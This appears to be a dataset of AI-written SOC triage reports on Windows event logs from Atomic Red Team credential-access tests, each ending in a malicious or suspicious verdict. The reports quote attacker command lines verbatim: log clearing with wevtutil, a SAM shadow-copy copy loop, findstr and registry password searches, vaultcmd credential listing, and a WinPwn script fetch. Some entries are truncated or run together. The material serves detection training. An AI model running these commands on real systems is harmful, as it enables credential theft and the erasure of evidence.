   - The execution of several processes with high integrity levels by the user 'SERVER002\\admin_test', such as `wevtutil.exe`, `conhost.exe`, and `PowerShell`, further raises suspicions due to their critical roles in system administration and potential misuse in lateral movement or persistence activities.

4. **Suspicious Powershell Command Line**:
   - The PowerShell command line includes coded functions and network directory enumeration, which are typical indicators of reconnaissance activities associated with cyber-attacks.

5. **Process Execution without Legitimate Context**:
   - Several processes seemingly related to legitimate software updates (e.g., `MicrosoftEdgeUpdate.exe`) appear numerous times but lack context or usual scheduling behavior, which could imply tampering or usage as staging processes for malicious payload execution.

**Assessment**:
Given the observations above, these logs show clear signs of attempted unauthorized access and potential compromise. The presence of a PowerShell script likely aimed at harvesting credentials, coupled with efforts to clear event logs, points towards these activities being orchestrated with malicious intent.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected host (SERVER002) from the network to prevent further exploitation or lateral movement by the attacker.
- Conduct a detailed forensic analysis on the host to identify any additional unauthorized changes or persistence mechanisms.
- Change all pertinent user credentials in case of compromised accounts, especially for the user 'admin_test'.
- Review and enhance security monitoring to detect similar activities in real-time in the future, and evaluate endpoint security controls.
- Report the incident to appropriate authorities and stakeholders as per company policy, due to the severity of the breach."
LaZagne - Credentials from Browser,"Upon analyzing the provided Windows event logs, the following observations and analyses are made regarding the potential indicators of compromise or malicious activity:

### Analysis

1. **Presence of `wevtutil.exe` Clearing Event Logs:**
   - Multiple instances of `wevtutil.exe` with command lines indicating clearing of event logs (`cl` command) such as Security, System, and Windows PowerShell logs have been observed:
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`
   - Event log entries indicating event log clearing:
     - System Logs: `EventID 104` for ""admin_test"" user in the System and Windows PowerShell channels.
     - Security Logs: `EventID 1102` indicating the Security log was cleared.

2. **Execution of Potential Credential Dumping Tool:**
   - The `cmd.exe` invoked `LaZagne.exe`, which is known for credential harvesting, specifically targeting browsers: 
     - `""cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1555.003\\bin\\LaZagne.exe\"" browsers""`

3. **Use of Potentially Malicious Administrative User Account:**
   - Several actions like clearing of logs and running potentially malicious tools have been executed under the account `admin_test`, which raises suspicion, indicating potential misuse or compromise of an administrative account.

4. **No Evidence of External Connections or Network-Based Indicators:**
   - No network-based activities or indicators pointing to external connections were found within the analyzed logs.

### Assessment

- While the execution of `wevtutil.exe` to clear logs and the invocation of `LaZagne.exe` are not definitive confirmations of compromise in isolation, when combined, these activities strongly suggest efforts to hide tracks and gather sensitive information, which are common behaviors associated with malicious activity.
- The presence of `admin_test`, which seems to be used for these actions, points to potential misuse of administrative privileges, which could be indicative of malicious intent.

### Resolution

**MALICIOUS**

### Guidance

1. **Immediate Actions:**
   - Isolate the system (Server002) to prevent further potential data exfiltration or lateral movement.
   - Begin an incident response to investigate the extent of the compromise, including examining additional logs not covered in this analysis.
   - Assess other systems for similar indicators of compromise.
  
2. **Further Investigation:**

   - Review network traffic for any anomalous or unauthorized outbound connections.
   - Perform a deep scan with an advanced security tool to detect any potential malware not captured in logs.

3. **Long-Term Measures:**
   - Implement enhanced logging and monitoring, with special attention to administrative accounts.
   - Consider using endpoint protection with behavioral detection capabilities to detect and prevent similar activities in the future.
   - Educate administrative users on recognizing and avoiding credential compromise.

Conclusively, the logs reveal activities commonly associated with malicious attempts to cover tracks possibly related to credential gathering or active persistence mechanisms on the system."
WinPwn - Loot local Credentials - lazagne,"Based on the analysis of the provided logs, several suspicious behaviors and potential indicators of malicious activity are identified:

1. **Log Clearing Activity:**
   - There are multiple instances of logs being cleared on the system, specifically the System log, Security log, and Windows PowerShell log. The log clearing was performed using `wevtutil.exe`, which is capable of managing event logs. The clearing of logs is often an indicator of an attempt to cover up tracks and is considered suspicious activity. The activity is performed by the user `admin_test`.

2. **PowerShell Execution with Suspicious Command:**
   - PowerShell was executed with the command that includes downloading and executing a script from an external source on GitHub (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This script seems to be part of a tool named WinPwn, which is known for penetration testing and red team activities, suggesting possible unauthorized access or pen-test-like activities. 
   - The command also utilizes `lazagnemodule`, a known component used for credential harvesting, further indicating malicious motives.

3. **Process Execution:**
   - The Sysmon logs show the execution of `wevtutil.exe` to clear specific event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This process execution aligns with the log clearance evidence from other logs. 
   - Other commands include a `whoami` invocation, which can suggest reconnaissance activity to gather user details.

4. **Unusual Time Synchronization Changes:**
   - While there are changes to system time recorded, system time changes by themselves may not be explicitly malicious unless specifically leveraged as part of an attack. In the context of the other activities, this could have been a measure implemented alongside other techniques to evade detection timelines.

**Resolution: MALICIOUS**

The actions recorded in the logs, combined, form a pattern indicative of malicious behavior, specifically due to the log clearing, use of PowerShell for potentially harmful activities, and changes to system settings. These activities warrant immediate attention and remediation, including:

- Conducting a thorough forensic investigation to determine the depth of compromise.
- Isolating the affected system(s) from the network.
- Performing a comprehensive review of all user accounts and access privileges, notably those of `admin_test`.
- Reviewing all network and endpoint security controls to prevent further unauthorized access.
- Considering notification of relevant stakeholders if sensitive or regulated data might have been accessed."
PowerShell - Prompt User for Password,"Given the analysis of the provided logs, several indicators suggest potentially suspicious and possibly malicious behavior:

1. **Log Clearing Events**: The logs indicate multiple instances where system and PowerShell event logs were cleared (Sysmon/EventID 104). The regular clearing of logs, especially during critical times, can be an attempt to cover up malicious activities, making it harder to track what occurred on the system.

2. **Unusual PowerShell Activity**: The PowerShell logs contain evidence of potentially suspicious commands:
   - A script was executed that prompts for a password in a GUI, and sensitive credentials might have been logged (PowerShell log/EventID 600). This script attempts to leverage PowerShell to extract user credentials, which could be a part of a phishing attack or privilege escalation attempt.
   - Multiple instances of PowerShell instances running commands like `whoami` and `hostname`, which are normally benign but can be suspicious in a series of automated invocations, especially if unexplained.

3. **Use of `whoami` and `hostname`**: Frequent use of these commands, as seen in the Sysmon logs, often helps an attacker understand the current user context and system identity. When observed alongside other suspicious activities, these commands can indicate reconnaissance activity.

4. **General Process Behavior**: There are numerous processes with elevated privileges executed in rapid succession without apparent legitimate purpose:
   - Processes like `wevtutil`, used to clear logs, are executed multiple times.
   - Other processes such as `whoami`, and `hostname` are invoked with high integrity levels, often associated with privilege escalation attempts.

5. **Environment Characteristics**: There's an evident usage of various system tools (wevtutil, conhost, etc.) in a sequence that seems automated or script-driven rather than initiated by a user.

Based on these observations, those activities may not align with typical administrative duties and could potentially indicate malicious intent. If such behavior wasn't scheduled or authorized as a part of regular system checks or updates, it warrants further investigation and is highly suspicious.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a thorough investigation to understand the intent behind these actions. 
- Capture forensic snapshots or backups of the current system state for further examination.
- Analyze processes and scripts that were executed during this period and validate connections and network activity from this host.
- Review user accounts and access rights, especially focusing on the `admin_test` account mentioned frequently in logs. 
- Determine if recent software installations have been authorized and vetted for security.
- Monitor for any subsequent suspicious activities.
- Consider additional protective measures such as endpoint detection and response (EDR) tools, and reinforce logging and monitoring.

Detecting even a potential compromise should be addressed with a comprehensive incident response plan to minimize impact and to reinforce system defenses moving forward."
List Credential Files via Command Prompt,"Upon analyzing the provided logs, the following points of interest suggest potential indicators of malicious activity:

1. **Event Log Clearing:**
   - There are multiple instances of event log clearing for different channels (Security, System, Windows PowerShell) by the user `admin_test` on `Server002`. Event log ID 1102 in the Security log and ID 104 in the System logs correspond to the clearing of these logs. Clearing logs is a suspicious action as it can indicate an attempt to cover tracks from malicious activities.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was executed multiple times, clearing several event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This activity was performed by the same user (`admin_test`), as indicated in various Sysmon logs. This pattern aligns with behavior often employed by attackers to erase traces of their presence.

3. **Suspicious Command Execution:**
   - The execution of `cmd.exe` with a command line that queries hidden files in specific credentials directories:
     ```
     ""cmd.exe"" /c dir /a:h C:\Users\%%USERNAME%%\AppData\Local\Microsoft\Credentials\ & dir /a:h C:\Users\%%USERNAME%%\AppData\Roaming\Microsoft\Credentials\
     ```
     This activity suggests an attempt to access possibly sensitive or credential-holding directories. Actions like these are typically associated with credential theft or reconnaissance steps in an attack.

4. **Event IDs and Executions Analysis:**
   - The logs show a series of process creations and command executions linked to `MicrosoftEdgeUpdate.exe`, which are benign in isolation but could be suspect when combined with other malicious actions, especially considering there's a related log clearing activity. Without additional suspicious context or anomalies, these update-related executions, in this case, don't independently classify as unusual outside normal update processes.

5. **Time Manipulation:**
   - The presence of events related to time adjustments in the system (Event ID 4616) indicates that the system time was modified. This could be used to deceive logging or as part of setting up for an attack carefully, although it is less directly indicative of malicious activity without additional corroborating logs.

**Assessment and Guidance:**

Based on the identified suspicious and potentially malicious activities, particularly the log-clearing actions (`wevtutil.exe` usage) and the execution of suspicious command lines, these logs appear consistent with signs of compromise or at least careful obfuscation efforts typically seen in malicious activities.

Resolution: **MALICIOUS**

**Guidance on how to proceed:**
- Immediate steps should be taken to isolate the affected system (Server002) for further investigation and prevent potential lateral movement within the network.
- Conduct a thorough forensic analysis of the system, focusing on retrieving any deleted logs if possible and reviewing file integrity, especially around critical system and credential stores.
- Investigate the activities performed under the `admin_test` account, including a review of recent changes and access controls, as this account appears to be the one carrying out suspicious activities.
- Implement enhanced monitoring across the network to detect further suspicious log-clearing or file-access activities.
- Consider deploying endpoint detection and response (EDR) tools if not already in place to provide better visibility into process and network activity patterns.
- Notify and coordinate with relevant stakeholders such as the IT security team and possibly legal/HR if insider threats are suspected."
dump volume shadow copy hives with System.IO.File,"### Detailed Analysis of the Provided Windows Event Logs

#### 1. **Windows PowerShell Log Analysis**
- The PowerShell logs reveal the execution of a command aimed at copying sensitive files from volume shadow copies. The specific script involves copying the `SAM` file from the shadow copies to the temp directory:
  ```powershell
  powershell.exe & {1..10 | % { try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"" , ""$env:TEMP\SAMvss$_"", ""true"") } catch {} ls ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore }}
  ```
- The `SAM` file (Security Account Manager) contains hashed user passwords, making this activity indicative of an attempt to access sensitive credential information. Such behavior is commonly associated with attempts at privilege escalation or lateral movement in a network.
- The command is designed to silently fail (`catch {}`), which is a common tactic to evade detection or interruption and indicates malicious intent.

#### 2. **System Log Analysis**
- Frequent log clearing activities are identified by the use of `wevtutil.exe`, which clears event logs such as Microsoft-Windows-Sysmon/Operational and PowerShell logs. The clearing of logs, especially security-relevant logs, is highly suspicious as it indicates an attempt to cover tracks following nefarious activities.

#### 3. **Security Log Analysis**
- The logs show multiple privilege escalation events leveraging the `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc., involving the user `admin_test`. These events indicate unusual access patterns that could be related to unauthorized administrative actions.
- There are also logons from a system service but using network logon types, possibly indicating remote access attempts.

#### 4. **Sysmon Log Analysis**
- The use of `wevtutil.exe` corroborates the log activities seen in the System logs, with evidence of command-line executions clearing critical logs.
- There is an occurrence of the `powershell.exe` process executing the previously mentioned suspicious scripts, which is consistent with leveraging PowerShell for post-exploitation activities and data extraction.

#### 5. **Additional Notes**
- The presence of Microsoft Edge updates and `taskhostw.exe` do not raise immediate suspicion as they are routine processes. However, given the surrounding suspicious activity, it is vital to validate these activities against known scheduled tasks and update cycles.

### Conclusion

The logs contain multiple indicators of compromise:
- The execution of PowerShell scripts to copy sensitive files like the `SAM` file.
- The clearing of event logs immediately following suspicious activity.
- Unauthorized administrative privileges being exercised.

Given this analysis, the behavior observed in the logs collectively indicates a **MALICIOUS** activity pattern. Immediate actions should include:
- Isolating the affected system (Server002) from the network.
- Conducting a comprehensive forensic analysis to understand the extent of the compromise.
- Reviewing and potentially resetting sensitive credentials affected by the `SAM` copy action.
- Enhancing monitoring and reviewing access controls and security configurations across systems to prevent further incidents."
Dump LSASS.exe using lolbin rdrleakdiag.exe,"Based on the analysis of the provided logs, several indicators suggest potentially malicious activity on the Windows machine named Server002:

1. **Event Log Clearing Activity (Event ID 104 and 1102)**:
   - There are multiple instances of event log clearance by the user ""admin_test"". This includes clearing logs from the System, Windows PowerShell, and Security channels. Event log clearing is typically associated with attackers attempting to cover their tracks, which is a common tactic in post-exploitation scenarios.

2. **Suspicious PowerShell Activity**:
   - In the Windows PowerShell logs, there's a script executed which involves accessing a potentially suspicious executable `rdrleakdiag.exe` to perform a full memory dump of the LSASS process. Capturing a memory dump of LSASS is a known technique used for credential dumping, which is a significant red flag for malicious behavior.

3. **Multiple High Integrity Level Executions**:
   - Multiple processes related to `wevtutil.exe` and `conhost.exe` were executed with high integrity levels by the user ""admin_test"". These processes were involved in clearing the logs, supporting the suspicious activity observed.

4. **Privilege Escalation and Use of High Privileges (Event ID 4672)**:
   - The user ""admin_test"" executed commands with high privileges including debugging and system environment privileges, indicating potential privilege escalation activities.

5. **Execution of Whoisami and Hostname Commands**:
   - The execution of commands like `whoami.exe` and `hostname.exe` is a typical step during reconnaissance where an attacker gathers information about the system and the context of their access.

Given these findings, the actions observed in the logs are consistent with known patterns of malicious behavior. Specifically, the event log clearing, suspicious PowerShell script execution aimed at dumping LSASS memory, combined with the high privilege use and command executions, strongly indicate a breach.

### Resolution
**MALICIOUS**: The logs contain activity that is unmistakably malicious in nature due to the presence of behaviors typical to post-compromise activities, including log clearing, credential dumping attempts, and the execution of scripts with potential for data exfiltration. Immediate incident response actions are recommended, including isolating the affected machine, conducting a thorough investigation to determine the extent of the compromise, and enhancing log monitoring to prevent future incidents."
Enumeration for Credentials in Registry,"Upon analyzing the provided Windows event logs, several instances of behavior were identified that require further investigation due to their potentially suspicious nature:

1. **Log File Clearance**: 
   - Event ID 1102 in the Security log and Event ID 104 in the System log indicate that the event logs for the System and Security channels were cleared by the user `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006). Clearing of logs is a typical behavior associated with attempts to remove traces of potentially unwanted or malicious activity from logs, indicating an attempt to hide actions on the system.

2. **Execution of Potentially Suspicious Commands**:
   - There is an instance of `cmd.exe` executing a command to query the Registry for keys related to passwords. The command line from Sysmon Log: `""cmd.exe"" /c reg query HKLM /f password /t REG_SZ /s & reg query HKCU /f password /t REG_SZ /s` is often associated with attempts to search potentially sensitive information from the registry, which could indicate credential access attempts.
   
3. **Potential Indicator of Malicious Usage of wevtutil.exe**:
   - The use of `wevtutil.exe` appears frequently in the logs. While this utility is used to manage event logs, its presence in activities that involve clearing of logs warrants additional scrutiny, especially when combined with the log clearance events.

4. **Potential Normal Windows Update Activities**:
   - Various system processes, such as `trustedinstaller.exe` and `wmi providers` (`wmiprvse.exe`) show up in the logs. These may relate to legitimate system maintenance or updates and are not necessarily indicative of inappropriate activity.

5. **Privilege Use**:
   - Event ID 4672 in the Security log records the assignment of multiple privileges to a session. While not explicitly suspicious on its own, privileges like `SeDebugPrivilege` or `SeBackupPrivilege` are of interest if they are used in conjunction with activities that compromise system integrity.

Conclusion:

- The act of log clearance by a user account prior to the end timestamps of the log data, especially in conjunction with commands querying sensitive parts of the system (passwords in this case), suggests potentially malicious activities are involved.
- The registry query for password-related entries and the cleared logs imply actions taken that are common in the initial stages of compromise.

Final Assessment: **MALICIOUS**

Recommendation:
- Conduct a thorough assessment of all user actions, especially those related to the `admin_test` account.
- Investigate the source, intention, and timeline of `wevtutil.exe` and cmd.exe activities related to logs and registry queries.
- Implement additional monitoring and logging measures to capture more detailed records of future activities. This would prevent potential log clearance or obfuscation.
- Check for other signs of compromise such as unfamiliar new user accounts, evidence of lateral movement, or privilege escalation activities."

PetitPotam,"Upon analyzing the provided Windows event logs, we can identify suspicious and potentially malicious behavior occurring on the Windows host Server002. Here's a detailed breakdown:

1. **Use of PowerShell and Potential PetitPotam Attack:**
   - We observe the execution of PowerShell with a command involving `PetitPotam.exe`, an executable related to a well-known attack vector used to force authentication on Windows platforms and potentially escalate privileges.
   - The PowerShell command is executed by the user `SERVER002\\admin_test` and contains references to an external payload in the temp directory, which is highly suspicious.
   - This particular sequence is highlighted in both Sysmon (EventID: 17997) and PowerShell logs (EventRecords: 1067 to 1074).

2. **Evading Detection via Log File Clearing:**
   - Events in the Security log (EventID 1102) and System log (EventID 104) indicate that log files have been cleared. This is often done by attackers post-exploit to cover their tracks, which strongly points toward malicious intent.

3. **Raw Process Creation with High Privilege:**
   - The `wevtutil.exe` utility is invoked multiple times to clear various event logs indicating an attempt to delete traces of actions undertaken.
   - This action is done by a high-integrity level process, in this case, the same `SERVER002\\admin_test` user, who seems to have elevated privileges, possibly administrator.

4. **Command Execution from Temporary Directory:**
   - The execution of a program from a `Temp` directory (`AtomicRedTeam\\..\\ExternalPayloads\\PetitPotam.exe`) raises a red flag. This is a common tactic used by attackers to execute temporary and potentially harmful payloads on the target system.

5. **Overall Activity and Patterns:**
   - The logs showcase an unusual, rapid sequence of utilitarian commands (`whoami`, `wevtutil`, etc.) suggesting automation or script-based attacks, typically used when testing or exploiting weaknesses in the system.

**Assessment Result:**
- The logs exhibit clear signs of **MALICIOUS** activity. The presence of potentially harmful PowerShell commands aimed at executing an exploitation tool (PetitPotam), combined with attempts to clear logs and obscure evidence, indicates a security compromise.

**Guidance on How to Proceed:**
1. **Immediate Isolation:** Disconnect Server002 from the network to prevent any further malicious actions.
2. **Forensic Investigation:** Conduct an in-depth forensic analysis to determine the full extent of the compromise, including any lateral movement or additional payloads deployed.
3. **Restore Logs:** Attempt to recover cleared logs from backups if possible to gain insights into the attacker’s activities and entry points.
4. **Patch and Protect:** Apply updates to mitigate the vulnerability exploited (if PetitPotam-related vulnerabilities are unpatched) and verify system security controls.
5. **Review User Access:** Investigate how the admin_test account was leveraged in the attack and assess for any additional user account compromise."
"Registry dump of SAM, creds, and secrets","**Analysis of Windows Event Logs:**

1. **Security Log Analysis:**
   - **Event ID 4624:** This event indicates a successful logon. The account used here is ""SYSTEM,"" which is normal for various system processes. The login type is 5, which means a service, and the process involved is `services.exe`. This is a standard system activity.
   - **Event ID 4672:** This event shows privileges assigned to the logged-on user, ""SYSTEM,"" which includes a high level of privileges (e.g., SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege). While these can be normal for the system, they are potent if misused or in the hands of an unauthorized user.
   - **Event ID 1102:** This event indicates the security audit log was cleared by the user ""admin_test."" Log clearance is a strong indicator of potential malicious activity as attackers often clear logs to hide their actions.

2. **Sysmon Log Analysis:**
   - Numerous events show the execution of processes like `whoami.exe`, `wevtutil.exe` (used for clearing event logs), and commands involving `cmd.exe` to save registry keys such as HKLM\sam, HKLM\system, and HKLM\security to temporary files. These activities are suspicious as they point to enumeration and potential credential dumping.
   - The command line activity through `cmd.exe` indicates an attempt to exfiltrate sensitive registry information, which can be used to gather credentials or system information.

3. **System Log Analysis:**
   - **Event ID 104:** Multiple logs (System, Windows PowerShell) were cleared by the user ""admin_test."" Log clearance for multiple system components around the same time is suspicious and often associated with malicious activity.

**Assessment:**
- The combination of high privilege processes being executed, logs being cleared, and registry key saves is a strong indication of suspicious and potentially malicious activity.
- The user ""admin_test"" is involved in activities typical of lateral movement and privilege escalation attempts, such as log clearance and sensitive data collection.

**Conclusion:**  
**Resolution: MALICIOUS**  
The presence of events related to log clearance, combined with commands aimed at saving sensitive registry sections, strongly indicates malicious activity. These actions commonly align with tactics used by attackers to gain unauthorized access to credentials and other critical information while attempting to cover their tracks.

**Recommendations:**
1. Immediately investigate the user account ""admin_test"" for unauthorized access or suspicious behavior.
2. Conduct a full audit and potential system forensics to assess the extent of compromise.
3. Strengthen monitoring and logging, ensure audit logs are backed up, and increase alerting on suspicious activities related to sensitive operations like registry access and log clearance.
4. Consider isolating the affected host to analyze and mitigate potential lateral movement within the network.

GPP Passwords (findstr),"### Log Analysis

#### Security Log
1. **Event ID 1102**: The security log was cleared by the user ""admin_test"". This action is highly suspicious as it is often associated with malicious activities, such as an attempt to cover tracks after unauthorized activities.

2. **Events ID 4616**: Two time change events were logged, with very close timestamps. Although time changes can be legitimate, they can also be used to manipulate logging and auditing, making these events slightly suspicious.

#### Application Log
- No particularly suspicious activities were detected here. The ""Service stopped"" log entries for the `edgeupdate` service do not immediately indicate malicious activity, although routine.

#### Sysmon Log
1. **Process Execution (Event IDs 1 and 5)**:
   - Multiple instances of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` executed by the user ""admin_test"". The use of PowerShell and `wevtutil.exe` to clear logs (`cl` command) is indicative of potentially malicious activity, as these tools can be used to manipulate system logs.
   - The command `""cmd.exe"" /c findstr /S cpassword %%logonserver%%\\sysvol\\*.xml` executed by ""admin_test"" is particularly concerning. This command searches for stored passwords (`cpassword`) within SYSVOL directories, suggesting an attempt to extract passwords from Group Policy Preferences, a known technique for credential theft.

2. **`whoami.exe` and `hostname.exe`**: These tools were executed typically to gather system and user information. While not necessarily malicious on their own, in conjunction with other activities, they could indicate reconnaissance actions as part of a broader attack vector.

3. **`microsftedgeupdate`**: Multiple Microsoft Edge Update processes executed by `nt authority\system` are observed, likely routine operations related to the update mechanism. However, the massive amount of logs related and creation of temporary directories is a bit unusual for simple updating tasks.

#### System Log
1. **Event ID 104 (Log File Cleared)**: Multiple system log files were cleared. This behavior is further evidence of attempt to cover tracks, which often follows system compromise and malicious activity.

### Conclusion and Guidance

Based on the analysis:
- Multiple actions indicative of malicious activity have been identified. These include the use of `wevtutil` to clear logs, usage of PowerShell and suspicious command-line activities attempting password extraction, and suspicious log clearing activities.

Azure - Dump Azure Instance Metadata from Virtual Machines,"Based on the analysis of the provided Windows event logs, several activities appear to indicate potentially suspicious or malicious behavior. Here’s the breakdown:

### 1. Security and System Logs:
- **Event ID 1102** in the Security log and **Event ID 104** in the System log indicate that logs were cleared on the system. Log clearing is often used by attackers to cover their tracks and can indicate an attempt to hide malicious activity. Both clearings were attributed to user ""admin_test"".

### 2. PowerShell Logs:
- The PowerShell logs show a suspicious script execution using **Invoke-RestMethod** to access a metadata service at `http://169.254.169.254/metadata/instance?api-version=2021-02-01`. This IP address is associated with metadata endpoints for cloud services (e.g., AWS, Azure). Accessing metadata endpoints in cloud environments can be an attempt to gather instance information, which is a common tactic used in cloud exploitation scenarios.

### 3. Sysmon Logs:
- Multiple invocations of **wevtutil.exe** for clearing logs in various channels, such as the Sysmon and Security channels. Using `wevtutil.exe` to clear logs is a known technique used by threat actors to hide their activities. This was done using the account ""admin_test"" with high integrity level, which indicates administrative privileges.
- Execution of **wevtutil.exe** with command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`, `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, suggests an attempt to remove traces from the event logs.
- **whoami.exe** and **hostname.exe** were run, which by themselves are benign but could be used together by attackers to gather information about logged-in users and hostnames.

### Assessment:
- There are clear signs of log tampering, likely as a cover-up for potentially malicious activities. Clearing security and system logs, coupled with suspicious PowerShell script execution that attempts to retrieve cloud instance metadata, suggests malicious intent.
- The activities suggest someone with administrative privileges (using the account ""admin_test"") is executing potentially harmful actions within the system.

### Resolution:
**MALICIOUS** - The logs indicate clear actions consistent with malicious activity.

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected host, Server002, to prevent further potential harm and lateral movement.
2. **Further Investigation**: Conduct a full forensic analysis to uncover the extent of the compromise. Review any other connected systems for signs of similarly malicious activity.

Access unattend.xml,"Upon reviewing the provided Windows event logs, several items stand out that warrant closer examination.

### Suspicious Behavior:
1. **Event Logs Clearing:**
   - Multiple instances where logs appear to have been cleared:
     - **Event ID 104** in the System Log indicates that the logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user `admin_test`.
     - **Event ID 1102** in the Security Log shows that the Security event log was cleared by the same user immediately afterward.

   Frequent clearing of logs can be an indicator of malicious activity, especially when it happens in close proximity. Attackers may clear logs to cover their tracks after executing malicious activities.

2. **Unusual Command-Line Operations:**
   - The use of `wevtutil.exe` command-line operations to clear logs for Microsoft-Windows-Sysmon, Application, System, and Security logs suggests intentional log tampering:
     - The process `wevtutil.exe` was executed multiple times by the user `SERVER002\\admin_test` to clear different logs. This, combined with the logs clearing events mentioned above, raises suspicion.

3. **Potential Sensitive File Access:**
   - **Event ID 1** in Sysmon log shows an execution of `cmd.exe` with a command-line argument to read contents of `unattend.xml` files from installation directories (`C:\\Windows\\Panther\\`). This action may indicate an attempt to gather sensitive system configuration or installation information, which could be used for further exploitation.

4. **Processes Executed by SYSTEM User:**
   - The presence of processes like `MicrosoftEdgeUpdate.exe`, both from Program Files and suspicious temporary directories, running under `NT AUTHORITY\\SYSTEM` highlighted in:
     - `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe`
     - `C:\\Program Files (x86)\\Microsoft\\Temp\\EU6111.tmp\\MicrosoftEdgeUpdate.exe`
   - These instances could reflect malicious activity hidden under the guise of legitimate software updates.

### Conclusion:
Based on the analysis of the ability to clear multiple logs simultaneously by the user `admin_test`, the execution of scripts to interact with potentially sensitive files, and repetitive actions to clear logs under different channels, these activities do not align with standard user behavior and suggest intentional obfuscation possibly related to malicious activities.

### Resolution: **MALICIOUS**
Given the evidence of log tampering, accessing potentially sensitive configuration files, and shadowy update executable locations, there is a compelling indication of malicious compromise.

Extracting passwords with findstr,"Upon reviewing the logs, here's a breakdown of the notable findings and the assessment:

### Indicators of Anomalous or Suspicious Activity:

1. **Event Log Clearing:**
   - Multiple logs indicate the clearing of system logs, particularly by the user `admin_test`. The events of log clearing (Event ID 104 for `System` and `Windows PowerShell` channels, and Event ID 1102 for `Security` channel) are highly suspicious. It implies an attempt to cover tracks, often an indicator of malicious activity attempting to hide its presence on the system.

2. **Suspicious PowerShell Activity:**
   - There is a PowerShell script execution with the command `powershell.exe & {findstr /si pass *.xml *.doc *.txt *.xls, ls -R | select-string -ErrorAction SilentlyContinue -Pattern password}`. This command suggests an attempt to search for potential passwords stored in local files, which indicates credential harvesting activity. The execution of such a script, especially without authorization, is a serious concern.

3. **Execution of `wevtutil` for Log Manipulation:**
   - `wevtutil.exe` is being used to clear logs on multiple occasions, targeting channels including `System`, `Application`, `Security`, and `Windows PowerShell`. This is consistent with the observation of logs being cleared and is particularly suspicious when it occurs in conjunction with other potentially harmful activities.

4. **Privileged Token Usage:**
   - Various privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, were assigned to the SYSTEM account. While not directly malicious, it is noteworthy if occurring in conjunction with other suspicious activities.

### Conclusion and Resolution:

Taking into account the clearing of logs, the use of PowerShell to search for passwords, and other corresponding activities, the actions captured in these logs are indeed indicators of potentially malicious behavior.

**Final Assessment: MALICIOUS**

3. **Unusual System Commands:**
   - The presence of command lines that involve checking `users.txt` in temp directories and using `net use` commands to connect to IPC$ shares, which is indicative of attempts to access or brute force network resources with a predefined password (“Spring2020”).

4. **Anomalies in Time Logs:**
   - There are time adjustments indicating potential tampering with the system clock (`NewTime` and `OldTime` discrepancies). This could have been done to further obfuscate actions in the logs.

5. **Privileged Execution:**
   - Logs show the user `admin_test` having high integrity level processes and possessing significant privileges such as SeDebugPrivilege, which are commonly exploited to dump credentials or escalate privileges.

### Indicator of Compromise:

- **Command and Batch File Execution:**
  Execution related to `AtomicRedTeam` suggests activities simulating attacker behavior.
- **Credential Dumping Techniques:**
  Reference to `T1110.003` and specific patterns related to this would require scrutiny.
- **Log Clearing:**
  Using `wevtutil.exe` to clear logs directly points to an attempt to hide actions.

### Conclusion:

The activities observed in the logs, such as the clearing of event logs, execution of security testing scripts, and attempts to access network resources with a preset password, strongly indicate that the system was subjected to activities simulating realistic attack techniques, if not a live attack itself. These are critical indicators of potential compromise or attempted compromise.

### Resolution:

**MALICIOUS**: The logs exhibit behavior typically associated with malicious activities, especially considering the log clearing attempts and the presence of known adversarial testing tools within a real environment context.

### Guidance:

- **Immediate Action:**
  - Isolate the affected host to prevent further unauthorized access or potential spread.
  - Conduct a thorough investigation to determine the full scope of the incident.
  - Examine other hosts for similar activities to ensure the incident is contained.

- **Forensic Analysis:**
  - Preserve and analyze other logs, including network traffic capturing and disk images if possible.
  - Verify if legitimate security testing was scheduled and authorized, and confirm with relevant teams.

- **Remediation:**
  - Change credentials associated with affected user accounts and reset passwords across the network.
  - Review and tighten security measures, ensuring regular monitoring and alerts for such activities.
  
- **Report and Documentation:**
  - Document the findings, potential impact, and actions taken for review and further improvement of security posture."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"The logs provided exhibit several signs of potentially suspicious activity. Here's a detailed breakdown:

1. **PowerShell Activity**:
   - The PowerShell logs show the execution of `powershell.exe` with the command `{vaultcmd /listcreds:""Web Credentials"" /all}`. This command can be used to extract stored credentials from the Windows Vault. The use of PowerShell to access credentials is a red flag and can signify an attempt to gather sensitive information from the system. 

2. **Event Log Clearing**:
   - The system log shows that event logs for the System and PowerShell channels were cleared by the user `admin_test`. Clearing of logs is a known tactic used by attackers to erase traces of their activities and hinder forensic analysis of a system.

3. **Wevtutil Activity**:
   - The Sysmon logs show multiple instances of `wevtutil.exe` being executed for cleaning various event logs like Sysmon, Application, Security, and System logs. The direct association of these events with the `admin_test` user, who also cleared the logs, raises suspicion.

4. **Use of Whoami and Hostname Commands**:
   - The usage of `whoami.exe` and `hostname.exe` could indicate reconnaissance activity to gather information about the current user and machine environment. While these commands are themselves benign, they may be part of a larger suspicious workflow.

